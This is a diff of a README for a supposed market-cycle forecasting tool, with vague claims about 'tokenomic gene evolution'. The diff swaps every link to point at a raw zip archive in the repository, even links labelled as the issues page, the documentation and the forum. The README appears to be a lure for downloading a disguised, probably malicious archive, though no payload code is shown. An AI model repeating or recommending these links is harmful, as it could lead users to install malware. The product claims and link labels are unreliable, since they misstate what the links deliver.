@@ -1,7 +1,7 @@
 # 🌟 Market-Cycle-Gene-Forecasting-Engine - Predict Market Biogenetics Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Market-Cycle-Gene-Forecasting-Engine_v3.8.zip%20release-brightgreen)](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Market-Cycle-Gene-Forecasting-Engine_v3.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Engine-Forecasting-Cycle-Market-Gene-3.3.zip%20release-brightgreen)](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Engine-Forecasting-Cycle-Market-Gene-3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the Market-Cycle-Gene-Forecasting-Engine. This framework helps you analyze and predict tokenomic gene evolution based on market cycles. You will find it useful for research in tokenomics, risk analysis, and economics. 
@@ -13,7 +13,7 @@ Welcome to the Market-Cycle-Gene-Forecasting-Engine. This framework helps you an
 - **Disk Space:** 500MB of free space needed to install
 
 ## 🔗 Download & Install
-To get your own copy of the Market-Cycle-Gene-Forecasting-Engine, visit [this page to download](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Market-Cycle-Gene-Forecasting-Engine_v3.8.zip). 
+To get your own copy of the Market-Cycle-Gene-Forecasting-Engine, visit [this page to download](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Engine-Forecasting-Cycle-Market-Gene-3.3.zip). 
 
 1. Open the link above.
 2. Look for the latest version.
@@ -63,17 +63,17 @@ The application will provide you with outputs that include:
 
 ## 📆 Updating the Software
 To keep your version updated:
-1. Occasionally return to [this page to download](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Market-Cycle-Gene-Forecasting-Engine_v3.8.zip).
+1. Occasionally return to [this page to download](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Engine-Forecasting-Cycle-Market-Gene-3.3.zip).
 2. Check for newer versions and repeat the installation steps. 
 
 ## 🤝 Support
 If you have questions or need help:
-- Check the [Issues](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Market-Cycle-Gene-Forecasting-Engine_v3.8.zip) section on GitHub.
+- Check the [Issues](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Engine-Forecasting-Cycle-Market-Gene-3.3.zip) section on GitHub.
 - Visit forums dedicated to tokenomics and data science.
 - Reach out via email for direct support.
 
 ## 🌐 Additional Resources
-- **Documentation:** For detailed guidance, please refer to the documentation found [here](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Market-Cycle-Gene-Forecasting-Engine_v3.8.zip).
-- **Community Forum:** Join discussions and share insights with others in the field [here](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Market-Cycle-Gene-Forecasting-Engine_v3.8.zip).
+- **Documentation:** For detailed guidance, please refer to the documentation found [here](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Engine-Forecasting-Cycle-Market-Gene-3.3.zip).
+- **Community Forum:** Join discussions and share insights with others in the field [here](https://raw.githubusercontent.com/Nosaakwa/Market-Cycle-Gene-Forecasting-Engine/main/mcgf/Engine-Forecasting-Cycle-Market-Gene-3.3.zip).
 
 Thank you for using Market-Cycle-Gene-Forecasting-Engine. Happy forecasting!
